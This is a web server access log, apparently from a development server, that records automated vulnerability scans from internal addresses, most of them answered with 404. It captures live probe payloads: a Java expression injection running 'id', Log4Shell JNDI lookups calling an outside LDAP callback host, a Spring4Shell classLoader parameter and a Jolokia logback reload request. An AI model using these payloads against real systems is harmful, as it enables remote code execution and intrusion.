2024-09-04 11:20:32,614.614 INFO [Thread-220 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:32] "[33mGET /__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1[0m" 404 -
2024-09-04 11:20:32,794.794 INFO [Thread-221 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:32] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-04 11:20:32,808.808 INFO [Thread-222 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:32] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-04 11:20:32,821.821 INFO [Thread-223 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:32] "[33mGET /${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/uwpsy2ts43mxacdr} HTTP/1.1[0m" 404 -
2024-09-04 11:20:32,835.835 INFO [Thread-224 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:32] "[33mGET /?${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/uwpsy2ts43mxacdr} HTTP/1.1[0m" 404 -
2024-09-04 11:20:32,849.849 INFO [Thread-225 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:32] "[33mPOST / HTTP/1.1[0m" 404 -
2024-09-04 11:20:32,864.864 INFO [Thread-226 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:32] "[33mPUT / HTTP/1.1[0m" 404 -
2024-09-04 11:20:36,008.008 INFO [Thread-227 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:36] "[33mGET /actuator/jolokia/list/ HTTP/1.1[0m" 404 -
2024-09-04 11:20:36,037.037 INFO [Thread-228 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:36] "[33mGET /jolokia/list/ HTTP/1.1[0m" 404 -
2024-09-04 11:20:36,269.269 INFO [Thread-229 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:36] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-04 11:20:36,287.287 INFO [Thread-230 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:36] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-09-04 11:20:37,164.164 INFO [Thread-231 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:37] "[33mGET /xxl-job-admin/api HTTP/1.1[0m" 404 -
2024-09-04 11:20:37,178.178 INFO [Thread-232 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:37] "[33mGET /api HTTP/1.1[0m" 404 -
2024-09-04 11:20:37,191.191 INFO [Thread-233 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:37] "[33mGET /ea-job-admin/api HTTP/1.1[0m" 404 -
2024-09-04 11:20:37,258.258 INFO [Thread-234 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:37] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-04 11:20:37,703.703 INFO [Thread-235 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:37] "[33mGET /?class.module.classLoader[0]=test HTTP/1.1[0m" 404 -
2024-09-04 11:20:37,825.825 INFO [Thread-236 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:37] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-04 11:20:37,842.842 INFO [Thread-237 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:37] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-09-04 11:20:38,395.395 ERROR [Thread-238 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:38] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01G\x01\x00\x01C\x03\x03E[+´["î\\')
2024-09-04 11:20:38,395.395 INFO [Thread-238 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:38] "[31m[1m\x16\x03\x01\x01G\x01\x00\x01C\x03\x03E[+´["î\\\x0c·1\x00\x99;T\x87-\x8b\x8aÕ[0m" 400 -
2024-09-04 11:20:38,520.520 INFO [Thread-239 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:38] "[33mGET /v1/agent/self HTTP/1.1[0m" 404 -
2024-09-04 11:20:39,182.182 INFO [Thread-240 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:39] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-04 11:20:39,251.251 INFO [Thread-241 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:39] "[33mPOST / HTTP/1.1[0m" 404 -
2024-09-04 11:20:39,265.265 INFO [Thread-242 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:39] "[33mPOST /login HTTP/1.1[0m" 404 -
2024-09-04 11:20:39,279.279 INFO [Thread-243 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:39] "[33mPOST /cas/login HTTP/1.1[0m" 404 -
2024-09-04 11:20:39,669.669 INFO [Thread-244 (process_request_thread)] [_internal.py:97] - 10.185.44.116 - - [04/Sep/2024 11:20:39] "[33mGET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:22222!/logback.xml HTTP/1.1[0m" 404 -
2024-09-14 20:23:35,618.618 ERROR [Thread-245 (process_request_thread)] [_internal.py:97] - 10.185.67.38 - - [14/Sep/2024 20:23:35] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
2024-09-14 20:23:35,619.619 INFO [Thread-245 (process_request_thread)] [_internal.py:97] - 10.185.67.38 - - [14/Sep/2024 20:23:35] "[31m[1m\x01\x00\x00ýÎú\x0b° \x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_[0m" 400 -
2024-09-14 20:23:40,627.627 ERROR [Thread-246 (process_request_thread)] [_internal.py:97] - 10.185.67.38 - - [14/Sep/2024 20:23:40] code 400, message Bad request version ('GetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00')
2024-09-14 20:23:40,628.628 INFO [Thread-246 (process_request_thread)] [_internal.py:97] - 10.185.67.38 - - [14/Sep/2024 20:23:40] "[31m[1m\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x0cGetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00[0m" 400 -
2024-09-14 20:23:40,642.642 INFO [Thread-248 (process_request_thread)] [_internal.py:97] - 10.185.67.38 - - [14/Sep/2024 20:23:40] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-14 20:27:08,299.299 INFO [Thread-249 (process_request_thread)] [_internal.py:97] - 10.185.67.38 - - [14/Sep/2024 20:27:08] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-14 20:27:35,538.538 INFO [Thread-250 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:35] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-14 20:27:35,556.556 INFO [Thread-251 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:35] "[33mGET /rIf3V4vJ HTTP/1.1[0m" 404 -
2024-09-14 20:27:35,572.572 INFO [Thread-252 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:35] "[33mGET /k3cloud/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:35,590.590 INFO [Thread-253 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:35] "[33mGET /dsview/protected/login.do HTTP/1.1[0m" 404 -
2024-09-14 20:27:35,606.606 INFO [Thread-254 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:35] "[33mGET /services/Version HTTP/1.1[0m" 404 -
2024-09-14 20:27:35,825.825 INFO [Thread-255 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:35] "[33mGET /login.html HTTP/1.1[0m" 404 -
2024-09-14 20:27:35,942.942 INFO [Thread-256 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:35] "[33mGET /api/docs HTTP/1.1[0m" 404 -
2024-09-14 20:27:36,162.162 INFO [Thread-257 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:36] "[33mGET /swagger.yaml HTTP/1.1[0m" 404 -
2024-09-14 20:27:36,380.380 INFO [Thread-258 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:36] "[33mGET /zabbix HTTP/1.1[0m" 404 -
2024-09-14 20:27:36,599.599 INFO [Thread-259 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:36] "[33mGET /swagger-ui.html HTTP/1.1[0m" 404 -
2024-09-14 20:27:36,818.818 INFO [Thread-260 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:36] "[33mGET /unified-console.html HTTP/1.1[0m" 404 -
2024-09-14 20:27:37,036.036 INFO [Thread-261 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:37] "[33mGET /cas/login HTTP/1.1[0m" 404 -
2024-09-14 20:27:37,155.155 INFO [Thread-262 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:37] "[33mGET /v2/api-docs/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:37,373.373 INFO [Thread-263 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:37] "[33mGET /index?as_more HTTP/1.1[0m" 404 -
2024-09-14 20:27:37,592.592 INFO [Thread-264 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:37] "[33mGET /nmc/login HTTP/1.1[0m" 404 -
2024-09-14 20:27:37,810.810 INFO [Thread-265 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:37] "[33mGET /png/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:38,029.029 INFO [Thread-266 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:38] "[33mGET /nexus/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:38,148.148 INFO [Thread-267 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:38] "[33mGET /static/apidoc/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:38,366.366 INFO [Thread-268 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:38] "[33mGET /dfshealth.html HTTP/1.1[0m" 404 -
2024-09-14 20:27:38,584.584 INFO [Thread-269 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:38] "[33mGET /swagger/swagger-ui.html HTTP/1.1[0m" 404 -
2024-09-14 20:27:38,821.821 INFO [Thread-270 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:38] "[33mGET /ui/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:39,040.040 INFO [Thread-271 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:39] "[33mGET /nacos/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:39,158.158 INFO [Thread-272 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:39] "[33mGET /swagger/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:39,377.377 INFO [Thread-273 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:39] "[33mGET /swagger-ui/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:39,595.595 INFO [Thread-274 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:39] "[33mGET /webapps/primus/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:39,813.813 INFO [Thread-275 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:39] "[33mGET /version HTTP/1.1[0m" 404 -
2024-09-14 20:27:40,032.032 INFO [Thread-276 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:40] "[33mGET /swagger/index.html HTTP/1.1[0m" 404 -
2024-09-14 20:27:40,149.149 INFO [Thread-277 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:40] "[33mGET /api-docs/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:40,367.367 INFO [Thread-278 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:40] "[33mGET /docs HTTP/1.1[0m" 404 -
2024-09-14 20:27:40,585.585 INFO [Thread-279 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:40] "[33mGET /user-login.html HTTP/1.1[0m" 404 -
2024-09-14 20:27:40,802.802 INFO [Thread-280 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:40] "[33mGET /jenkins HTTP/1.1[0m" 404 -
2024-09-14 20:27:41,020.020 INFO [Thread-281 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:41] "[33mGET /doc/index.html HTTP/1.1[0m" 404 -
2024-09-14 20:27:41,239.239 INFO [Thread-282 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:41] "[33mGET /ws/v1/cluster/info HTTP/1.1[0m" 404 -
2024-09-14 20:27:41,358.358 INFO [Thread-283 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:41] "[33mGET /devices HTTP/1.1[0m" 404 -
2024-09-14 20:27:41,575.575 INFO [Thread-284 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:41] "[33mGET /clickhouse/data/query HTTP/1.1[0m" 404 -
2024-09-14 20:27:41,792.792 INFO [Thread-285 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:41] "[33mGET /healthz HTTP/1.1[0m" 404 -
2024-09-14 20:27:42,010.010 INFO [Thread-286 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:42] "[33mGET /core/auth/login/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:42,227.227 INFO [Thread-287 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:42] "[33mGET /?query= HTTP/1.1[0m" 404 -
2024-09-14 20:27:42,345.345 INFO [Thread-288 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:42] "[33mGET /cas HTTP/1.1[0m" 404 -
2024-09-14 20:27:42,563.563 INFO [Thread-289 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:42] "[33mGET /swagger.json HTTP/1.1[0m" 404 -
2024-09-14 20:27:42,781.781 INFO [Thread-290 (process_request_thread)] [_internal.py:97] - 10.185.65.248 - - [14/Sep/2024 20:27:42] "[33mGET /login HTTP/1.1[0m" 404 -
2024-09-14 20:27:44,693.693 INFO [Thread-291 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:44] "[31m[1mGET /console HTTP/1.1[0m" 400 -
2024-09-14 20:27:45,040.040 INFO [Thread-292 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:45] "[33mGET /__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1[0m" 404 -
2024-09-14 20:27:45,225.225 INFO [Thread-293 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:45] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-14 20:27:45,238.238 INFO [Thread-294 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:45] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-14 20:27:45,252.252 INFO [Thread-295 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:45] "[33mGET /${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/r7z298h0ktkuj9z3} HTTP/1.1[0m" 404 -
2024-09-14 20:27:45,267.267 INFO [Thread-296 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:45] "[33mGET /?${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/r7z298h0ktkuj9z3} HTTP/1.1[0m" 404 -
2024-09-14 20:27:45,281.281 INFO [Thread-297 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:45] "[33mPOST / HTTP/1.1[0m" 404 -
2024-09-14 20:27:45,298.298 INFO [Thread-298 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:45] "[33mPUT / HTTP/1.1[0m" 404 -
2024-09-14 20:27:48,445.445 INFO [Thread-299 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:48] "[33mGET /actuator/jolokia/list/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:48,463.463 INFO [Thread-300 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:48] "[33mGET /jolokia/list/ HTTP/1.1[0m" 404 -
2024-09-14 20:27:48,704.704 INFO [Thread-301 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:48] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-14 20:27:48,723.723 INFO [Thread-302 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:48] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-09-14 20:27:49,609.609 INFO [Thread-303 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:49] "[33mGET /xxl-job-admin/api HTTP/1.1[0m" 404 -
2024-09-14 20:27:49,623.623 INFO [Thread-304 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:49] "[33mGET /api HTTP/1.1[0m" 404 -
2024-09-14 20:27:49,640.640 INFO [Thread-305 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:49] "[33mGET /ea-job-admin/api HTTP/1.1[0m" 404 -
2024-09-14 20:27:49,708.708 INFO [Thread-306 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:49] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-14 20:27:50,164.164 INFO [Thread-307 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:50] "[33mGET /?class.module.classLoader[0]=test HTTP/1.1[0m" 404 -
2024-09-14 20:27:50,292.292 INFO [Thread-308 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:50] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-14 20:27:50,311.311 INFO [Thread-309 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:50] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-09-14 20:27:50,872.872 ERROR [Thread-310 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:50] code 400, message Bad request version ("\x9dG\x89¨Y³k4\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
2024-09-14 20:27:50,872.872 INFO [Thread-310 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:50] "[31m[1m\x16\x03\x01\x01G\x01\x00\x01C\x03\x03/â¨!õÛ\x0c®LkÃ¥\x82X\x93y\x93°.Aà;\x09\x0eì\x08J?\x1cN>Ô \x16²"J%\x96 ëv×H\x00ð\x8d×´¨oÏÌÎ^\x95 \x9dG\x89¨Y³k4\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À­À®À¬À$À(À#À'À[0m" 400 -
2024-09-14 20:27:50,995.995 INFO [Thread-311 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:50] "[33mGET /v1/agent/self HTTP/1.1[0m" 404 -
2024-09-14 20:27:51,658.658 INFO [Thread-312 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:51] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-14 20:27:51,728.728 INFO [Thread-313 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:51] "[33mPOST / HTTP/1.1[0m" 404 -
2024-09-14 20:27:51,744.744 INFO [Thread-314 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:51] "[33mPOST /login HTTP/1.1[0m" 404 -
2024-09-14 20:27:51,758.758 INFO [Thread-315 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:51] "[33mPOST /cas/login HTTP/1.1[0m" 404 -
2024-09-14 20:27:52,154.154 INFO [Thread-316 (process_request_thread)] [_internal.py:97] - 10.185.50.34 - - [14/Sep/2024 20:27:52] "[33mGET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:22222!/logback.xml HTTP/1.1[0m" 404 -
2024-09-19 10:22:23,383.383 ERROR [Thread-317 (process_request_thread)] [_internal.py:97] - 10.185.59.74 - - [19/Sep/2024 10:22:23] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
2024-09-19 10:22:23,384.384 INFO [Thread-317 (process_request_thread)] [_internal.py:97] - 10.185.59.74 - - [19/Sep/2024 10:22:23] "[31m[1m\x01\x00\x00ýÎú\x0b° \x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_[0m" 400 -
2024-09-19 10:22:28,371.371 ERROR [Thread-318 (process_request_thread)] [_internal.py:97] - 10.185.59.74 - - [19/Sep/2024 10:22:28] code 400, message Bad request version ('GetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00')
2024-09-19 10:22:28,371.371 INFO [Thread-318 (process_request_thread)] [_internal.py:97] - 10.185.59.74 - - [19/Sep/2024 10:22:28] "[31m[1m\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x0cGetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00[0m" 400 -
2024-09-19 10:22:28,386.386 INFO [Thread-320 (process_request_thread)] [_internal.py:97] - 10.185.59.74 - - [19/Sep/2024 10:22:28] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-19 10:25:56,160.160 INFO [Thread-321 (process_request_thread)] [_internal.py:97] - 10.185.59.74 - - [19/Sep/2024 10:25:56] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-19 10:27:27,317.317 INFO [Thread-322 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:27] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-19 10:27:27,335.335 INFO [Thread-323 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:27] "[33mGET /kGLMOUlc HTTP/1.1[0m" 404 -
2024-09-19 10:27:27,362.362 INFO [Thread-324 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:27] "[33mGET /static/apidoc/ HTTP/1.1[0m" 404 -
2024-09-19 10:27:27,380.380 INFO [Thread-325 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:27] "[33mGET /swagger.yaml HTTP/1.1[0m" 404 -
2024-09-19 10:27:27,398.398 INFO [Thread-326 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:27] "[33mGET /clickhouse/data/query HTTP/1.1[0m" 404 -
2024-09-19 10:27:27,618.618 INFO [Thread-327 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:27] "[33mGET /zabbix HTTP/1.1[0m" 404 -
